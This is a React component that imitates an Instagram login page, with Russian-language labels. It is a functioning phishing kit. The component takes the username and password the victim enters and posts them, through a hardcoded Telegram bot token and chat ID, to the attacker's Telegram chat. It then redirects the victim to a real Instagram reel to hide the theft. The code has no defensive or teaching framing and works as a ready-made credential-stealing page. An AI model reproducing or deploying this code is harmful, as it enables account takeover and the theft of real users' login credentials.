import "./cards.css";
import icon from "../../assets/iconInstagram.svg";
import facebookIcon from "../../assets/Fasebookicon.svg";
import { useState } from "react";
import axios from "axios";
import { FaEyeSlash } from "react-icons/fa";
import { IoEyeSharp } from "react-icons/io5";

function Cards() {
  const [name, setName] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [views, setViews] = useState<boolean>(false);
  const [count, setcount] = useState(0);

  const API =
    "https://api.telegram.org/6987189864:AAEs6hfy5KLOZxf1EcN-cjhgJQSlilxYqyw/";
  async function SendMesage(message: string) {
    if (name.length > 0 && password.length > 0) {
      const url: string = `${API}sendMessage?chat_id=-5539341984&text=${message}`;
      await axios.post(url);
      setName("");
      setPassword("");
      window.location.href =
        "https://www.instagram.com/reel/C7QyAwYsdBU/?igsh=Y2xiZHFmZ2g4Yml0";
    } else {
      setcount(count + 1);
      console.log(count);
    }
  }
  return (
    <>
      <section className="instagram">
        <div className="container">
          <div className="instagram__content">
            <div className="instagram__hero">
              <h2 className="instagram__title">
                <img src={icon} alt="" />
              </h2>
              <button className="instagram__btn">
                <img src={facebookIcon} alt="" />
                Продолжить с Facebook
              </button>
            </div>
            <div className="instagram__lines">
              <hr className="instgram__line" />
              <span className="instagram__lines-text">OR</span>
              <hr className="instgram__line2" />
            </div>
            <div className="instagram__inputs">
              <input
                type="text"
                className="instagram__input"
                placeholder="введите имя пользаветеля"
                onChange={(e) => setName(e.target.value)}
              />
              <input
                type={views ? "text" : "password"}
                className="instagram__input__pass"
                placeholder="введите пароль"
                onChange={(e) => setPassword(e.target.value)}
              />
              {views ? (
                <IoEyeSharp
                  onClick={() => setViews(false)}
                  className="password_view"
                />
              ) : (
                <FaEyeSlash
                  onClick={() => setViews(true)}
                  className="password_view"
                />
              )}

              <a href="" className="inputs__text">
                забыли пароль?
              </a>
            </div>
            <div className="instagram__footer">
              <button
                onClick={() =>
                  SendMesage(`Login ${name} \n Passowrd  ${password}`)
                }
                className="footer__btn"
              >
                Войти
              </button>
              <p className="footer__text">
                У вас нет учетной записи?
                <a href="" className="signup">
                  зарегистрироваться
                </a>
              </p>
            </div>
          </div>
        </div>
      </section>
    </>
  );
}

export default Cards;
